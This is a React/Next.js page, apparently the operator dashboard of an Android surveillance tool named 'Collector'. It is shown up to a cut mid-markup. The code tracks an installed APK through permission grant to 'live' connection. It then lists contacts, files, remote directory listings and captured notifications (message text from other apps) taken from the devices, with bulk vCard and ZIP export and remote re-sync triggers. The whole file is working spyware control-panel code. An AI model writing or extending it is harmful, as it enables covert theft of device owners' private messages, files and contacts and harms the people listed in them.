'use client';

import React, { useState, useEffect, useCallback, useMemo } from 'react';
import {
  Phone,
  Download,
  Copy,
  Check,
  Users,
  ChevronRight,
  ArrowLeft,
  Search,
  X,
  FileText,
  Share2,
  FolderOpen,
  File,
  Image,
  Music,
  Video,
  FileIcon,
  Archive,
  Eye,
  Loader2,
  RefreshCw,
  Shield,
  HardDrive,
  Wifi,
  WifiOff,
  CheckCircle2,
  Circle,
  Play,
  Trash2,
  ChevronDown,
  Home,
  Folder,
  RefreshCcw,
  Smartphone,
  Monitor,
  TabletSmartphone,
  Bell,
  MessageSquare,
  KeyRound,
  EyeOff,
  Lock,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Avatar, AvatarFallback } from '@/components/ui/avatar';
import { Badge } from '@/components/ui/badge';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Separator } from '@/components/ui/separator';
import { useToast } from '@/hooks/use-toast';

// ─── Types ───────────────────────────────────────────────

type SessionStatus =
  | 'apk_built'
  | 'waiting_install'
  | 'app_installed'
  | 'permissions_granted'
  | 'syncing_contacts'
  | 'syncing_files'
  | 'live_connected'
  | 'offline';

interface StatusEntry {
  status: SessionStatus;
  timestamp: string;
  detail?: string;
}

interface DeviceInfo {
  id: string;
  name: string;
  model: string;
  brand: string;
  androidVersion: string;
  lastHeartbeat?: string;
  firstSeen: string;
  isOnline: boolean;
}

interface ContactInfo {
  id: string;
  name: string;
  phone: string;
  email?: string;
  organization?: string;
  deviceId?: string;
}

interface FileInfo {
  name: string;
  path: string;
  isDirectory: boolean;
  size: number;
  lastModified: number;
  fileType: string;
}

interface UploadedFileInfo {
  id: string;
  fileName: string;
  filePath: string;
  fileSize: number;
  fileType: string;
  downloadUrl: string;
  uploadedAt: string;
  deviceId?: string;
}


interface NotificationRecord {
  id: string;
  sessionId: string;
  deviceId?: string;
  packageName: string;
  appName: string;
  title: string;
  text: string;
  bigText?: string;
  subText?: string;
  summaryText?: string;
  textLines?: string[];
  category?: string;
  priority: number;
  postTime: number;
  capturedAt: number;
  receivedAt: string;
}


interface SessionListInfo {
  id: string;
  count: number;
  fileCount: number;
  appName: string;
  createdAt: string;
  status: SessionStatus | null;
  isOnline: boolean;
}

interface SessionData {
  id: string;
  contacts: ContactInfo[];
  files: FileInfo[];
  uploadedFiles: UploadedFileInfo[];
  appName: string;
  count: number;
  fileCount: number;
  createdAt: string;
  status: SessionStatus | null;
  statusHistory: StatusEntry[];
  lastHeartbeat: string | null;
  isOnline: boolean;
  devices: Record<string, DeviceInfo>;
}

// ─── Status Stepper ──────────────────────────────────────

const STATUS_STEPS: { key: SessionStatus; label: string }[] = [
  { key: 'apk_built', label: 'APK Built' },
  { key: 'waiting_install', label: 'Waiting Install' },
  { key: 'app_installed', label: 'App Installed' },
  { key: 'permissions_granted', label: 'Permissions' },
  { key: 'syncing_contacts', label: 'Syncing Contacts' },
  { key: 'syncing_files', label: 'Syncing Files' },
  { key: 'live_connected', label: 'Live Connected' },
];

function getStepIndex(status: SessionStatus | null): number {
  if (!status) return -1;
  const idx = STATUS_STEPS.findIndex(s => s.key === status);
  return idx;
}

function StatusStepper({ status, isOnline }: { status: SessionStatus | null; isOnline: boolean }) {
  const currentIdx = getStepIndex(status);

  return (
    <div className="bg-[#075E54] px-3 py-3">
      <div className="flex items-center justify-between mb-2">
        <span className="text-white/80 text-xs font-semibold">Setup Progress</span>
        {isOnline ? (
          <span className="inline-flex items-center gap-1.5 text-xs font-bold text-[#25D366]">
            <span className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse" />
            LIVE
          </span>
        ) : (
          <span className="inline-flex items-center gap-1.5 text-xs font-bold text-white/40">
            <span className="w-2 h-2 rounded-full bg-white/30" />
            OFFLINE
          </span>
        )}
      </div>
      <div className="flex items-start gap-0">
        {STATUS_STEPS.map((step, idx) => {
          const isCompleted = idx < currentIdx;
          const isCurrent = idx === currentIdx;
          const isFuture = idx > currentIdx;

          return (
            <div key={step.key} className="flex flex-col items-center flex-1 min-w-0">
              <div className="flex items-center w-full">
                {idx > 0 && (
                  <div className={`flex-1 h-0.5 ${idx <= currentIdx ? 'bg-[#25D366]' : 'bg-white/20'}`} />
                )}
                <div
                  className={`w-5 h-5 rounded-full flex items-center justify-center shrink-0 ${
                    isCompleted
                      ? 'bg-[#25D366]'
                      : isCurrent
                      ? 'bg-[#25D366]/20 border-2 border-[#25D366]'
                      : 'bg-white/10'
                  }`}
                >
                  {isCompleted ? (
                    <CheckCircle2 className="w-3 h-3 text-white" />
                  ) : isCurrent ? (
                    <div className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse" />
                  ) : (
                    <Circle className="w-2 h-2 text-white/30" />
                  )}
                </div>
                {idx < STATUS_STEPS.length - 1 && (
                  <div className={`flex-1 h-0.5 ${idx < currentIdx ? 'bg-[#25D366]' : 'bg-white/20'}`} />
                )}
              </div>
              <span
                className={`text-[8px] mt-1 text-center leading-tight ${
                  isCompleted || isCurrent ? 'text-[#25D366] font-semibold' : 'text-white/40'
                }`}
              >
                {step.label}
              </span>
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ─── vCard Generator ────────────────────────────────────

function escapeVCard(str: string): string {
  return str
    .replace(/\\/g, '\\\\')
    .replace(/;/g, '\\;')
    .replace(/:/g, '\\:')
    .replace(/\n/g, '\\n')
    .replace(/,/g, '\\,');
}

function generateVCard(contact: ContactInfo): string {
  const lines = [
    'BEGIN:VCARD',
    'VERSION:3.0',
    `FN:${escapeVCard(contact.name)}`,
    `N:${escapeVCard(contact.name)};;;;`,
    `TEL;TYPE=CELL:${escapeVCard(contact.phone)}`,
  ];
  if (contact.email) lines.push(`EMAIL;TYPE=HOME:${escapeVCard(contact.email)}`);
  if (contact.organization) lines.push(`ORG:${escapeVCard(contact.organization)}`);
  lines.push('END:VCARD');
  return lines.join('\n');
}

function generateAllVCard(contacts: ContactInfo[]): string {
  return contacts.map(generateVCard).join('\n\n');
}

// ─── Utilities ──────────────────────────────────────────

const AVATAR_COLORS = [
  'bg-emerald-600', 'bg-teal-600', 'bg-cyan-600', 'bg-green-700',
  'bg-lime-700', 'bg-emerald-700', 'bg-teal-700', 'bg-cyan-700',
];

function getAvatarColor(name: string): string {
  let hash = 0;
  for (let i = 0; i < name.length; i++) {
    hash = name.charCodeAt(i) + ((hash << 5) - hash);
  }
  return AVATAR_COLORS[Math.abs(hash) % AVATAR_COLORS.length];
}

function getInitials(name: string): string {
  const parts = name.trim().split(/\s+/);
  if (parts.length >= 2) return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
  return name.slice(0, 2).toUpperCase();
}

function formatFileSize(bytes: number): string {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function getFileIcon(type: string) {
  switch (type) {
    case 'image': return <Image className="w-5 h-5 text-purple-500" aria-label="Image file" />;
    case 'video': return <Video className="w-5 h-5 text-red-500" />;
    case 'audio': return <Music className="w-5 h-5 text-orange-500" />;
    case 'pdf': return <FileText className="w-5 h-5 text-red-600" />;
    case 'document': return <FileText className="w-5 h-5 text-blue-500" />;
    case 'apk': return <FileIcon className="w-5 h-5 text-green-500" />;
    case 'vcf': return <Phone className="w-5 h-5 text-[#25D366]" />;
    case 'archive': return <Archive className="w-5 h-5 text-yellow-600" />;
    case 'folder': return <FolderOpen className="w-5 h-5 text-yellow-500" />;
    default: return <File className="w-5 h-5 text-gray-500" />;
  }
}

function getFileBgColor(type: string): string {
  switch (type) {
    case 'image': return 'bg-purple-50';
    case 'video': return 'bg-red-50';
    case 'audio': return 'bg-orange-50';
    case 'pdf': return 'bg-red-50';
    case 'document': return 'bg-blue-50';
    default: return 'bg-gray-50';
  }
}

function timeAgo(dateStr: string): string {
  const now = new Date();
  const date = new Date(dateStr);
  const diffMs = now.getTime() - date.getTime();
  const diffMins = Math.floor(diffMs / 60000);
  const diffHours = Math.floor(diffMs / 3600000);
  if (diffMins < 1) return 'Just now';
  if (diffMins < 60) return `${diffMins}m ago`;
  if (diffHours < 24) return `${diffHours}h ago`;
  return date.toLocaleDateString();
}

// ─── Tab Type ──────────────────────────────────────────

type Tab = 'contacts' | 'files' | 'manager' | 'notifications';

// ─── Main View Component ────────────────────────────────

export default function CollectorViewPage({ params }: { params: Promise<{ id: string }> }) {
  const { toast } = useToast();
  const [sessionId, setSessionId] = useState('');
  const [contacts, setContacts] = useState<ContactInfo[]>([]);
  const [files, setFiles] = useState<FileInfo[]>([]);
  const [uploadedFiles, setUploadedFiles] = useState<UploadedFileInfo[]>([]);
  const [appName, setAppName] = useState('Collector');
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [fetchKey, setFetchKey] = useState(0);
  const [activeTab, setActiveTab] = useState<Tab>('contacts');
  const [selectedContact, setSelectedContact] = useState<ContactInfo | null>(null);
  const [view, setView] = useState<'list' | 'detail'>('list');
  const [searchQuery, setSearchQuery] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [copiedAll, setCopiedAll] = useState(false);
  const [showVcardAll, setShowVcardAll] = useState(false);
  const [zipDownloading, setZipDownloading] = useState(false);
  const [fileTypeFilter, setFileTypeFilter] = useState<string>('all');
  const [previewFile, setPreviewFile] = useState<UploadedFileInfo | null>(null);

  // Status tracking state
  const [sessionStatus, setSessionStatus] = useState<SessionStatus | null>(null);
  const [isOnline, setIsOnline] = useState(false);
  const [fileViewMode, setFileViewMode] = useState<'list' | 'grid'>('list');
  const [syncingContacts, setSyncingContacts] = useState(false);
  // File Manager state
  const [managerPath, setManagerPath] = useState('/');
  const [managerData, setManagerData] = useState<{ currentPath: string; breadcrumbs: { name: string; path: string }[]; directories: { name: string; path: string; fileCount: number; totalSize: number }[]; files: any[] } | null>(null);
  const [managerLoading, setManagerLoading] = useState(false);
  const [deletingFileId, setDeletingFileId] = useState<string | null>(null);

  // Multi-device state
  const [devices, setDevices] = useState<Record<string, DeviceInfo>>({});
  const [selectedDeviceId, setSelectedDeviceId] = useState<string>('');
  const [deletingSession, setDeletingSession] = useState(false);

  // Copy link state
  const [copiedLink, setCopiedLink] = useState(false);

  // Change access code states
  const [showChangeCodeModal, setShowChangeCodeModal] = useState(false);
  const [oldCodeInput, setOldCodeInput] = useState('');
  const [newCodeInput, setNewCodeInput] = useState('');
  const [changeCodeError, setChangeCodeError] = useState('');
  const [changeCodeLoading, setChangeCodeLoading] = useState(false);

  // Delete data states
  const [deletingData, setDeletingData] = useState<string | null>(null);
  const [showDeleteDataModal, setShowDeleteDataModal] = useState(false);
  const [deleteDataType, setDeleteDataType] = useState<'contacts' | 'files' | 'fileType'>('contacts');
  const [deleteFileTypeName, setDeleteFileTypeName] = useState<string>('');
  const [deleteDataAccessCode, setDeleteDataAccessCode] = useState('');
  const [deleteDataError, setDeleteDataError] = useState('');


  // Session list state (for session switcher)
  const [allSessions, setAllSessions] = useState<SessionListInfo[]>([]);
  const [showSessionList, setShowSessionList] = useState(false);
  // Notification states
  const [notifications, setNotifications] = useState<NotificationRecord[]>([]);
  const [notifLoading, setNotifLoading] = useState(false);
  const [notifSearch, setNotifSearch] = useState('');
  const [notifAppFilter, setNotifAppFilter] = useState('');
  const [notifApps, setNotifApps] = useState<string[]>([]);
  const [notifTotal, setNotifTotal] = useState(0);
  const [deletingNotifs, setDeletingNotifs] = useState(false);


  useEffect(() => {
    params.then(p => setSessionId(p.id));
  }, [params]);

  const saveToHistory = useCallback((data: SessionData) => {
    try {
      const stored = localStorage.getItem('contact_sessions');
      const sessions = stored ? JSON.parse(stored) : [];
      if (!sessions.find((s: any) => s.id === data.id)) {
        sessions.unshift({
          id: data.id,
          count: data.count,
          fileCount: data.fileCount,
          appName: data.appName,
          createdAt: data.createdAt,
        });
        localStorage.setItem('contact_sessions', JSON.stringify(sessions));
      }
    } catch {}
  }, []);

  // Status polling - every 5 seconds
  useEffect(() => {
    if (!sessionId) return;
    const poll = async () => {
      try {
        const res = await fetch(`/api/sessions/${sessionId}/status`);
        if (res.ok) {
          const data = await res.json();
          setSessionStatus(data.status);
          setIsOnline(data.isOnline);
          if (data.devices) {
            setDevices(data.devices);
          }
        }
      } catch {}
    };
    poll();
    const interval = setInterval(poll, 5000);
    return () => clearInterval(interval);
  }, [sessionId]);

  // Fetch on sessionId change or manual refresh (fetchKey change)
  useEffect(() => {
    if (!sessionId) return;
    let cancelled = false;

    fetch(`/api/contacts/view/${sessionId}`)
      .then(res => {
        if (!res.ok) throw new Error('not found');
        return res.json();
      })
      .then((data: SessionData) => {
        if (cancelled) return;
        setContacts(data.contacts);
        setFiles(data.files || []);
        setUploadedFiles(data.uploadedFiles || []);
        setAppName(data.appName || 'Collector');
        setSessionStatus(data.status);
        setIsOnline(data.isOnline);
        if (data.devices) {
          setDevices(data.devices);
        }
        saveToHistory(data);
        setLoading(false);
      })
      .catch(() => {
        if (cancelled) return;
        setError('Session not found or expired');
        setLoading(false);
      });

    return () => { cancelled = true; };
  }, [sessionId, fetchKey, saveToHistory]);

  // Manual refresh handler
  const handleRefresh = useCallback(() => {
    setFetchKey(k => k + 1);
  }, []);

  // ─── Delete Data Handlers ───────────────────────────
  const handleDeleteData = useCallback(async () => {
    if (!deleteDataAccessCode.trim()) {
      setDeleteDataError('Access code required');
      return;
    }
    setDeletingData('processing');
    setDeleteDataError('');
    try {
      let endpoint = '';
      let body: any = { sessionId, accessCode: deleteDataAccessCode.trim() };

      if (deleteDataType === 'contacts') {
        endpoint = '/api/sessions/delete-contacts';
      } else if (deleteDataType === 'fileType') {
        endpoint = '/api/sessions/delete-files';
        body.fileType = deleteFileTypeName;
      } else {
        endpoint = '/api/sessions/delete-files';
      }

      const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });
      const data = await res.json();
      if (res.ok) {
        setShowDeleteDataModal(false);
        setDeleteDataAccessCode('');
        setDeleteDataError('');
        handleRefresh();
      } else {
        setDeleteDataError(data.error || 'Failed to delete');
      }
    } catch {
      setDeleteDataError('Failed to delete data');
    }
    setDeletingData(null);
  }, [deleteDataType, deleteFileTypeName, deleteDataAccessCode, sessionId, handleRefresh]);

  const openDeleteDataModal = useCallback((type: 'contacts' | 'files' | 'fileType', fileTypeName?: string) => {
    setDeleteDataType(type);
    setDeleteFileTypeName(fileTypeName || '');
    setDeleteDataAccessCode('');
    setDeleteDataError('');
    setShowDeleteDataModal(true);
  }, []);



  // Fetch all sessions for session switcher
  const fetchAllSessions = useCallback(async () => {
    try {
      const res = await fetch('/api/sessions');
      if (res.ok) {
        const data = await res.json();
        if (Array.isArray(data)) {
          setAllSessions(data);
        }
      }
    } catch {}
  }, []);

  // Fetch sessions on mount and refresh periodically
  useEffect(() => {
    if (sessionId) {
      fetchAllSessions();
    }
  }, [sessionId, fetchAllSessions]);

  // Refresh session list every 30 seconds
  useEffect(() => {
    if (!sessionId) return;
    const interval = setInterval(fetchAllSessions, 30000);
    return () => clearInterval(interval);
  }, [sessionId, fetchAllSessions]);

  // Fetch notifications
  const fetchNotifications = useCallback(async () => {
    if (!sessionId) return;
    setNotifLoading(true);
    try {
      let url = `/api/notifications/${sessionId}?limit=200`;
      if (notifSearch) url += `&q=${encodeURIComponent(notifSearch)}`;
      if (notifAppFilter) url += `&app=${encodeURIComponent(notifAppFilter)}`;
      const res = await fetch(url);
      if (res.ok) {
        const data = await res.json();
        setNotifications(data.notifications || []);
        setNotifTotal(data.total || 0);
        setNotifApps(data.apps || []);
      }
    } catch {}
    setNotifLoading(false);
  }, [sessionId, notifSearch, notifAppFilter]);

  // Delete all notifications for this session
  const handleDeleteAllNotifications = useCallback(async () => {
    if (!sessionId) return;
    if (!confirm('Delete all captured notifications? This cannot be undone.')) return;
    setDeletingNotifs(true);
    try {
      const res = await fetch(`/api/notifications/${sessionId}`, { method: 'DELETE' });
      if (res.ok) {
        toast({ title: 'Deleted!', description: 'All notifications deleted.' });
        fetchNotifications();
      } else {
        toast({ title: 'Delete Failed', description: 'Could not delete notifications.' });
      }
    } catch {
      toast({ title: 'Delete Failed', description: 'Network error.' });
    }
    setDeletingNotifs(false);
  }, [sessionId, toast, fetchNotifications]);

  // Auto-fetch notifications when tab is active
  useEffect(() => {
    if (activeTab === 'notifications' && sessionId) {
      fetchNotifications();
    }
  }, [activeTab, sessionId, fetchNotifications]);

  // Auto-refresh notifications every 10 seconds when tab is active
  useEffect(() => {
    if (activeTab !== 'notifications' || !sessionId) return;
    const interval = setInterval(fetchNotifications, 10000);
    return () => clearInterval(interval);
  }, [activeTab, sessionId, fetchNotifications]);

  // Contact sync handler
  const handleSyncContacts = useCallback(async () => {
    if (!sessionId) return;
    setSyncingContacts(true);
    try {
      const res = await fetch('/api/contacts/sync', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId }),
      });
      if (res.ok) {
        const data = await res.json();
        setSessionStatus('syncing_contacts');
        toast({ title: 'Sync Started!', description: 'Device will re-upload contacts on next heartbeat.' });
      } else {
        toast({ title: 'Sync Failed', description: 'Could not trigger contact sync.' });
      }
    } catch {
      toast({ title: 'Sync Failed', description: 'Network error. Please try again.' });
    }
    setSyncingContacts(false);
  }, [sessionId, toast]);

  // File Manager browse handler
  const browseDirectory = useCallback(async (dirPath: string, deviceId?: string) => {
    if (!sessionId) return;
    setManagerLoading(true);
    setManagerPath(dirPath);
    try {
      const effectiveDeviceId = deviceId || selectedDeviceId;
      let url = `/api/files/browse?sessionId=${sessionId}&path=${encodeURIComponent(dirPath)}`;
      if (effectiveDeviceId) {
        url += `&deviceId=${encodeURIComponent(effectiveDeviceId)}`;
      }
      const res = await fetch(url);
      if (res.ok) {
        const data = await res.json();
        setManagerData(data);
      }
    } catch {}
    setManagerLoading(false);
  }, [sessionId, selectedDeviceId]);

  // File delete handler
  const handleDeleteFile = useCallback(async (fileId: string) => {
    if (!sessionId) return;
    setDeletingFileId(fileId);
    try {
      const res = await fetch('/api/files/delete', {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ fileId, sessionId }),
      });
      if (res.ok) {
        toast({ title: 'Deleted!', description: 'File deleted successfully.' });
        // Refresh data
        setFetchKey(k => k + 1);
        // Re-browse current directory
        browseDirectory(managerPath);
      } else {
        toast({ title: 'Delete Failed', description: 'Could not delete file.' });
      }
    } catch {
      toast({ title: 'Delete Failed', description: 'Network error.' });
    }
    setDeletingFileId(null);
  }, [sessionId, managerPath, toast, browseDirectory]);

  // Delete session handler
  const handleDeleteSession = useCallback(async () => {
    if (!sessionId) return;
    if (!confirm('Are you sure you want to delete this session? This action cannot be undone.')) return;
    setDeletingSession(true);
    try {
      const res = await fetch(`/api/sessions/${sessionId}`, {
        method: 'DELETE',
      });
      if (res.ok) {
        toast({ title: 'Session Deleted', description: 'Session has been deleted successfully.' });
        // Remove from local history
        try {
          const stored = localStorage.getItem('contact_sessions');
          if (stored) {
            const sessions = JSON.parse(stored);
            const filtered = sessions.filter((s: any) => s.id !== sessionId);
            localStorage.setItem('contact_sessions', JSON.stringify(filtered));
          }
        } catch {}
        // Navigate home
        window.location.href = '/';
      } else {
        toast({ title: 'Delete Failed', description: 'Could not delete session.' });
      }
    } catch {
      toast({ title: 'Delete Failed', description: 'Network error.' });
    }
    setDeletingSession(false);
  }, [sessionId, toast]);

  // Copy session view link
  const copyViewLink = useCallback(async () => {
    const origin = window.location.origin;
    const url = origin + '/view/' + sessionId;
    try {
      await navigator.clipboard.writeText(url);
    } catch {
      const textarea = document.createElement('textarea');
      textarea.value = url;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
    }
    setCopiedLink(true);
    toast({ title: 'Link Copied!', description: 'Session view link copied to clipboard' });
    setTimeout(() => setCopiedLink(false), 2000);
  }, [sessionId, toast]);

  // Change access code handler
  const handleChangeCode = useCallback(async () => {
    if (!sessionId || !oldCodeInput.trim() || !newCodeInput.trim()) {
      setChangeCodeError('Please fill all fields');
      return;
    }
    if (newCodeInput.trim().length !== 4 || !/^\d{4}$/.test(newCodeInput.trim())) {
      setChangeCodeError('New code must be exactly 4 digits');
      return;
    }
    setChangeCodeLoading(true);
    setChangeCodeError('');
    try {
      const res = await fetch('/api/sessions/change-access-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, oldCode: oldCodeInput.trim(), newCode: newCodeInput.trim() }),
      });
      const data = await res.json();
      if (res.ok) {
        setShowChangeCodeModal(false);
        setOldCodeInput('');
        setNewCodeInput('');
        toast({ title: 'Code Changed!', description: 'Access code updated successfully' });
      } else {
        setChangeCodeError(data.error || 'Failed to change access code');
      }
    } catch {
      setChangeCodeError('Failed to change access code');
    }
    setChangeCodeLoading(false);
  }, [sessionId, oldCodeInput, newCodeInput, toast]);

  // Browse manager directory when tab switches to manager
  useEffect(() => {
    if (activeTab !== 'manager' || !sessionId) return;
    let cancelled = false;
    const effectiveDeviceId = selectedDeviceId;
    let url = `/api/files/browse?sessionId=${sessionId}&path=${encodeURIComponent(managerPath)}`;
    if (effectiveDeviceId) {
      url += `&deviceId=${encodeURIComponent(effectiveDeviceId)}`;
    }
    fetch(url)
      .then(res => { if (!res.ok) throw new Error(); return res.json(); })
      .then(data => { if (!cancelled) setManagerData(data); })
      .catch(() => {})
      .finally(() => { if (!cancelled) setManagerLoading(false); });
    return () => { cancelled = true; };
  }, [activeTab, sessionId, managerPath, selectedDeviceId]);

  // Device-specific counts
  const deviceContactCounts = useMemo(() => {
    const counts: Record<string, number> = {};
    contacts.forEach(c => {
      if (c.deviceId) {
        counts[c.deviceId] = (counts[c.deviceId] || 0) + 1;
      }
    });
    return counts;
  }, [contacts]);

  const deviceFileCounts = useMemo(() => {
    const counts: Record<string, number> = {};
    uploadedFiles.forEach(f => {
      if (f.deviceId) {
        counts[f.deviceId] = (counts[f.deviceId] || 0) + 1;
      }
    });
    return counts;
  }, [uploadedFiles]);

  const filteredContacts = useMemo(() => {
    let result = contacts;
    // Filter by selected device
    if (selectedDeviceId) {
      result = result.filter(c => c.deviceId === selectedDeviceId);
    }
    // Filter by search query
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase();
      result = result.filter(c =>
        c.name.toLowerCase().includes(q) ||
        c.phone.toLowerCase().includes(q) ||
        (c.email && c.email.toLowerCase().includes(q))
      );
    }
    return result;
  }, [contacts, searchQuery, selectedDeviceId]);

  const filteredFiles = useMemo(() => {
    let result = uploadedFiles;
    // Filter by selected device
    if (selectedDeviceId) {
      result = result.filter(f => f.deviceId === selectedDeviceId);
    }
    if (fileTypeFilter !== 'all') {
      result = result.filter(f => f.fileType === fileTypeFilter);
    }
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase();
      result = result.filter(f => f.fileName.toLowerCase().includes(q));
    }
    return result;
  }, [uploadedFiles, fileTypeFilter, searchQuery, selectedDeviceId]);

  const totalUploadSize = useMemo(() => {
    return filteredFiles.reduce((sum, f) => sum + f.fileSize, 0);
  }, [filteredFiles]);

  const fileTypeCounts = useMemo(() => {
    const source = selectedDeviceId
      ? uploadedFiles.filter(f => f.deviceId === selectedDeviceId)
      : uploadedFiles;
    const counts: Record<string, number> = {};
    source.forEach(f => {
      counts[f.fileType] = (counts[f.fileType] || 0) + 1;
    });
    return counts;
  }, [uploadedFiles, selectedDeviceId]);

  const copyVCard = useCallback(async (contact: ContactInfo) => {
    try {
      await navigator.clipboard.writeText(generateVCard(contact));
      setCopiedId(contact.id);
      toast({ title: 'Copied!', description: `${contact.name}'s vCard copied` });
      setTimeout(() => setCopiedId(null), 2000);
    } catch {
      const textarea = document.createElement('textarea');
      textarea.value = generateVCard(contact);
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      setCopiedId(contact.id);
      toast({ title: 'Copied!', description: `${contact.name}'s vCard copied` });
      setTimeout(() => setCopiedId(null), 2000);
    }
  }, [toast]);

  const copyAllVCard = useCallback(async () => {
    try {
      await navigator.clipboard.writeText(generateAllVCard(filteredContacts));
      setCopiedAll(true);
      toast({ title: 'All Copied!', description: `${filteredContacts.length} contacts vCard copied` });
      setTimeout(() => setCopiedAll(false), 2000);
    } catch {
      const textarea = document.createElement('textarea');
      textarea.value = generateAllVCard(filteredContacts);
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      setCopiedAll(true);
      toast({ title: 'All Copied!', description: `${filteredContacts.length} contacts vCard copied` });
      setTimeout(() => setCopiedAll(false), 2000);
    }
  }, [filteredContacts, toast]);

  const downloadVCard = useCallback((contact: ContactInfo) => {
    const blob = new Blob([generateVCard(contact)], { type: 'text/vcard' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${contact.name.replace(/\s+/g, '_')}.vcf`;
    a.click();
    URL.revokeObjectURL(url);
  }, []);

  const downloadAllVCard = useCallback(() => {
    const blob = new Blob([generateAllVCard(filteredContacts)], { type: 'text/vcard' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'all_contacts.vcf';
    a.click();
    URL.revokeObjectURL(url);
  }, [filteredContacts]);

  const shareVCard = useCallback(async (contact: ContactInfo) => {
    const vcard = generateVCard(contact);
    if (navigator.share) {
      try { await navigator.share({ title: `${contact.name} - Contact`, text: vcard }); } catch {}
    } else { await copyVCard(contact); }
  }, [copyVCard]);

  const downloadZip = useCallback(async () => {
    setZipDownloading(true);
    try {
      let url = `/api/files/download/${sessionId}`;
      if (selectedDeviceId) {
        url += `?deviceId=${encodeURIComponent(selectedDeviceId)}`;
      }
      const res = await fetch(url);
      if (!res.ok) throw new Error('Download failed');
      const blob = await res.blob();
      const blobUrl = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = blobUrl;
      a.download = `${(appName || 'collector').replace(/\s+/g, '-').toLowerCase()}.zip`;
      a.click();
      URL.revokeObjectURL(blobUrl);
      toast({ title: 'Download Started!', description: 'ZIP file is downloading' });
    } catch (err) {
      toast({ title: 'Download Failed', description: 'No uploaded files available yet. Files will appear as the app syncs them in the background.' });
    }
    setZipDownloading(false);
  }, [sessionId, appName, toast, selectedDeviceId]);

  const downloadSingleFile = useCallback(async (file: UploadedFileInfo) => {
    try {
      const res = await fetch(file.downloadUrl);
      if (!res.ok) throw new Error('Download failed');
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = file.fileName;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    } catch {
      window.open(file.downloadUrl, '_blank');
    }
  }, []);

  // Device list for rendering
  const deviceList = useMemo(() => {
    return Object.values(devices);
  }, [devices]);

  // ─── Loading ───────────────────────────────────────
  if (loading) {
    return (
      <div className="min-h-screen flex flex-col bg-gradient-to-b from-[#075E54] to-[#054D44]">
        <div className="px-4 py-3 bg-[#075E54] flex items-center gap-3">
          <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center">
            <Shield className="w-4 h-4 text-white" />
          </div>
          <h1 className="text-white font-semibold text-lg">Collector</h1>
        </div>
        <div className="flex-1 flex flex-col items-center justify-center px-6">
          <div className="w-16 h-16 rounded-full border-4 border-white/20 border-t-[#25D366] animate-spin mb-6" />
          <h3 className="text-white font-semibold text-lg mb-2">Loading Data...</h3>
          <p className="text-white/60 text-sm text-center">Fetching contacts &amp; files</p>
        </div>
      </div>
    );
  }

  // ─── Error ─────────────────────────────────────────
  if (error) {
    return (
      <div className="min-h-screen flex flex-col bg-gradient-to-b from-[#075E54] to-[#054D44]">
        <div className="px-4 py-3 bg-[#075E54] flex items-center gap-3">
          <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center">
            <Shield className="w-4 h-4 text-white" />
          </div>
          <h1 className="text-white font-semibold text-lg">Collector</h1>
        </div>
        <div className="flex-1 flex flex-col items-center justify-center px-6">
          <h3 className="text-white font-semibold text-lg mb-2 text-center">Not Found</h3>
          <p className="text-white/60 text-sm text-center mb-8 max-w-xs">{error}</p>
          <a href="/">
            <Button className="bg-[#25D366] hover:bg-[#20BD5A] text-white font-semibold h-12 rounded-xl px-8">
              <ArrowLeft className="w-5 h-5 mr-2" /> Go Home
            </Button>
          </a>
        </div>
      </div>
    );
  }

  // ─── Contact Detail View ──────────────────────────
  if (view === 'detail' && selectedContact) {
    const vcard = generateVCard(selectedContact);
    return (
      <div className="min-h-screen flex flex-col bg-[#ECE5DD]">
        <div className="bg-[#075E54] px-4 py-3 flex items-center gap-3 shadow-md">
          <button onClick={() => { setView('list'); setSelectedContact(null); }} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center">
            <ArrowLeft className="w-5 h-5 text-white" />
          </button>
          <Avatar className="w-10 h-10">
            <AvatarFallback className={`${getAvatarColor(selectedContact.name)} text-white font-semibold text-sm`}>
              {getInitials(selectedContact.name)}
            </AvatarFallback>
          </Avatar>
          <div className="flex-1 min-w-0">
            <h2 className="text-white font-semibold text-base truncate">{selectedContact.name}</h2>
            <p className="text-white/70 text-xs">{selectedContact.organization || 'Contact Details'}</p>
          </div>
        </div>
        <div className="flex-1 px-4 py-6 space-y-4 overflow-y-auto">
          <div className="bg-white rounded-2xl p-6 shadow-sm">
            <div className="flex flex-col items-center mb-5">
              <Avatar className="w-20 h-20 mb-3">
                <AvatarFallback className={`${getAvatarColor(selectedContact.name)} text-white font-bold text-2xl`}>
                  {getInitials(selectedContact.name)}
                </AvatarFallback>
